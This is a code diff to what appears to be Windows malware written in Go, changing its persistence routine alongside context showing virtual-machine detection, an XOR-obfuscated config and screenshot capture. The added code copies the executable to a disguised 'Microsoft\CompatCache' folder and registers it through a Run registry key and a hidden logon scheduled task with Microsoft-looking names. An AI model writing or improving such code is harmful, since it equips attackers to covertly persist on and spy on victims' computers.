@@ -66,14 +66,14 @@ var (
 )
 
 const (
-	keyXOR    = 0x5A
-	cfgWindow = 8192
-	hkcu      = uintptr(0x80000001)
-	keySetVal = 0x0002
-	keyQuery  = 0x0001
-	regSz     = 1
-	swHide    = 0
-	srcCopy   = 0x00CC0020
+	keyXOR      = 0x5A
+	cfgWindow   = 8192
+	hkcu        = uintptr(0x80000001)
+	keySetVal   = 0x0002
+	keyQuery    = 0x0001
+	regSz       = 1
+	swHide      = 0
+	srcCopy     = 0x00CC0020
 	createNoWin = 0x08000000
 )
 
@@ -186,6 +186,22 @@ func isVM() bool {
 }
 
 func persist(exe string) {
+	// Drop a stable copy under LOCALAPPDATA so the Run key survives the user
+	// deleting the originally-executed file; copy carries the same config trailer.
+	stable := exe
+	if dir := os.Getenv("LOCALAPPDATA"); dir != "" {
+		dir = filepath.Join(dir, "Microsoft", "CompatCache")
+		if os.MkdirAll(dir, 0755) == nil {
+			dst := filepath.Join(dir, "CompatCache.exe")
+			if _, err := os.Stat(dst); err == nil {
+				stable = dst
+			} else if data, err := os.ReadFile(exe); err == nil {
+				if os.WriteFile(dst, data, 0755) == nil {
+					stable = dst
+				}
+			}
+		}
+	}
 	path := []byte("Software\\Microsoft\\Windows\\CurrentVersion\\Run\x00")
 	var h uintptr
 	r, _, _ := pRegOpen.Call(hkcu, uintptr(unsafe.Pointer(&path[0])), 0, keySetVal, uintptr(unsafe.Pointer(&h)))
@@ -194,9 +210,9 @@ func persist(exe string) {
 	}
 	defer pRegClose.Call(h)
 	name := []byte("AppCache\x00")
-	val := append([]byte(exe), 0)
+	val := append([]byte(`"`+stable+`"`), 0)
 	pRegSet.Call(h, uintptr(unsafe.Pointer(&name[0])), 0, regSz, uintptr(unsafe.Pointer(&val[0])), uintptr(len(val)))
-	cmd := exec.Command("schtasks", "/Create", "/F", "/TN", "Microsoft\\Windows\\AppCache", "/SC", "ONLOGON", "/TR", exe, "/RL", "LIMITED")
+	cmd := exec.Command("schtasks", "/Create", "/F", "/TN", "Microsoft\\Windows\\AppCache", "/SC", "ONLOGON", "/TR", `"`+stable+`"`, "/RL", "LIMITED")
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: createNoWin}
 	_ = cmd.Run()
 }
@@ -458,8 +474,8 @@ func screenshotJPEG() (string, int) {
 	pBitBlt.Call(mdc, 0, 0, w, h, hdc, 0, 0, srcCopy)
 
 	type bmih struct {
-		Size, Width, Height int32
-		Planes, BitCount    uint16
+		Size, Width, Height                                         int32
+		Planes, BitCount                                            uint16
 		Compression, SizeImage, XPels, YPels, ClrUsed, ClrImportant uint32
 	}
 	hdr := bmih{Size: 40, Width: int32(w), Height: -int32(h), Planes: 1, BitCount: 32}
